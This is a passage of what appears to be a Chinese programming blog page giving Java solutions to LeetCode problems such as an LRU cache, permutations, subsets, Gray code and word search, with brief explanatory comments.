<h3 id="剑指-Offer-58-I-翻转单词顺序"><a href="#剑指-Offer-58-I-翻转单词顺序" class="headerlink" title="剑指 Offer 58 - I. 翻转单词顺序"></a><a href="https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/">剑指 Offer 58 - I. 翻转单词顺序</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.trim().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s1.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                sb.append(s1[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(s1[i]).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-53-II-0～n-1中缺失的数字"><a href="#剑指-Offer-53-II-0～n-1中缺失的数字" class="headerlink" title="剑指 Offer 53 - II. 0～n-1中缺失的数字"></a><a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">剑指 Offer 53 - II. 0～n-1中缺失的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">missingNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] != mid) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">return</span> <span class="variable">left</span> <span class="operator">=</span>= nums.length - <span class="number">1</span> &amp;&amp; nums[left] == left ? nums.length : left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="448-找到所有数组中消失的数字"><a href="#448-找到所有数组中消失的数字" class="headerlink" title="448. 找到所有数组中消失的数字"></a><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/">448. 找到所有数组中消失的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原地操作, 取余</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">findDisappearedNumbers</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (num - <span class="number">1</span>) % n;</span><br><span class="line">            nums[x] += n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= n) &#123;</span><br><span class="line">                res.add(i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="415-字符串相加"><a href="#415-字符串相加" class="headerlink" title=" 415. 字符串相加"></a><a href="https://leetcode-cn.com/problems/add-strings"> 415. 字符串相加</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addStrings</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] nc1 = num1.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] nc2 = num2.toCharArray();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>, i = nc1.length - <span class="number">1</span>, j = nc2.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc1[i--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc2[j--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(carry % <span class="number">10</span>);</span><br><span class="line">            carry /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title=" 31. 下一个排列"></a><a href="https://leetcode-cn.com/problems/next-permutation"> 31. 下一个排列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从后往前, 找到第一次升序的两个数(下标为x,y, 然后将y-len这部分升序排序,</span></span><br><span class="line"><span class="comment">//从这个序列找到第一个比下标x大的数,然后交换即可</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nextPermutation</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 这里的不能是nums.length - 1</span></span><br><span class="line">            Arrays.sort(nums, i, nums.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[i - <span class="number">1</span>];</span><br><span class="line">                    nums[i - <span class="number">1</span>] = nums[j];</span><br><span class="line">                    nums[j] = tmp;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] copy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            nums[i] = copy[nums.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="165-比较版本号"><a href="#165-比较版本号" class="headerlink" title="165. 比较版本号"></a><a href="https://leetcode-cn.com/problems/compare-version-numbers">165. 比较版本号</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareVersion</span><span class="params">(String version1, String version2)</span> &#123;</span><br><span class="line">        <span class="comment">//\\会转义成反斜杠，反斜杠本身就是转义符，所有就成了“\.”，在进行转义就是.，所以\\.实际上是“.”。</span></span><br><span class="line">        String[] a1 = version1.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        String[] a2 = version2.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Math.max(a1.length, a2.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> (i &lt; a1.length ? Integer.parseInt(a1[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> (i &lt; a2.length ? Integer.parseInt(a2[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a &gt; b)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="169-多数元素"><a href="#169-多数元素" class="headerlink" title=" 169. 多数元素"></a><a href="https://leetcode-cn.com/problems/majority-element"> 169. 多数元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == min) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                    min = nums[i];</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><h3 id="146-LRU-缓存机制-x2F"><a href="#146-LRU-缓存机制-x2F" class="headerlink" title="146. LRU 缓存机制&#x2F;"></a><a href="https://leetcode-cn.com/problems/lru-cache/">146. LRU 缓存机制</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 哈希表+双向链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="keyword">private</span> Node tail;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, Node&gt; map;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">        <span class="built_in">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">this</span>.tail = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.pre  = head;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        moveToHead(node);</span><br><span class="line">        <span class="keyword">return</span> node.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">moveToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        </span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(key, value);</span><br><span class="line">            map.put(key, node1);</span><br><span class="line">            addToHead(node1);</span><br><span class="line">            size++;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; capacity) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node2</span> <span class="operator">=</span> removeTail();</span><br><span class="line">                map.remove(node2.key);</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            moveToHead(node);</span><br><span class="line">            node.val = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node <span class="title function_">removeTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> tail.pre;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.pre.next = node.next;</span><br><span class="line">        node.next.pre = node.pre;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.next = head.next;</span><br><span class="line">        node.pre  = head;</span><br><span class="line">        head.next.pre = node;</span><br><span class="line">        head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    Node pre, next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h2><h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode-cn.com/problems/permutations/">46. 全排列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">boolean</span>[]  visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length];</span><br><span class="line">        dfs(nums, path, visited, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, List&lt;Integer&gt; path, <span class="type">boolean</span>[] visited, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.size() == nums.length) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            visited[i] = <span class="literal">true</span>;</span><br><span class="line">            path.add(nums[i]);</span><br><span class="line">            dfs(nums, path, visited, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a><a href="https://leetcode-cn.com/problems/subsets/">78. 子集</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 回溯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(<span class="number">0</span>, nums, path, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span>[] nums, List&lt;Integer&gt; path, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">            path.add(nums[j]);</span><br><span class="line">            dfs(j + <span class="number">1</span>, nums, path, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="89-格雷编码-x2F"><a href="#89-格雷编码-x2F" class="headerlink" title="89. 格雷编码&#x2F;"></a><a href="https://leetcode-cn.com/problems/gray-code/">89. 格雷编码</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 异或</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">grayCode</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        关键是搞清楚格雷编码的生成过程, G(i) = i ^ (i/2);</span></span><br><span class="line"><span class="comment">        如 n = 3: </span></span><br><span class="line"><span class="comment">        G(0) = 000, </span></span><br><span class="line"><span class="comment">        G(1) = 1 ^ 0 = 001 ^ 000 = 001</span></span><br><span class="line"><span class="comment">        G(2) = 2 ^ 1 = 010 ^ 001 = 011 </span></span><br><span class="line"><span class="comment">        G(3) = 3 ^ 1 = 011 ^ 001 = 010</span></span><br><span class="line"><span class="comment">        G(4) = 4 ^ 2 = 100 ^ 010 = 110</span></span><br><span class="line"><span class="comment">        G(5) = 5 ^ 2 = 101 ^ 010 = 111</span></span><br><span class="line"><span class="comment">        G(6) = 6 ^ 3 = 110 ^ 011 = 101</span></span><br><span class="line"><span class="comment">        G(7) = 7 ^ 3 = 111 ^ 011 = 100</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        List&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1</span>&lt;&lt;n; ++i)</span><br><span class="line">            ret.add(i ^ i&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="79-单词搜索"><a href="#79-单词搜索" class="headerlink" title="79. 单词搜索"></a><a href="https://leetcode-cn.com/problems/word-search/">79. 单词搜索</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 把刚访问过的直接加256,然后在深度遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="212-单词搜索-II"><a href="#212-单词搜索-II" class="headerlink" title="212. 单词搜索 II"></a><a href="https://leetcode-cn.com/problems/word-search-ii/">212. 单词搜索 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 可以被构成的单词</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历每个单词,判断是否可以构成</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exist(board, word)) &#123;</span><br><span class="line">                res.add(word);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回溯 + 字典树</span></span><br><span class="line"><span class="comment">// 可以省去查找重复单词的时间</span></span><br><span class="line"><span 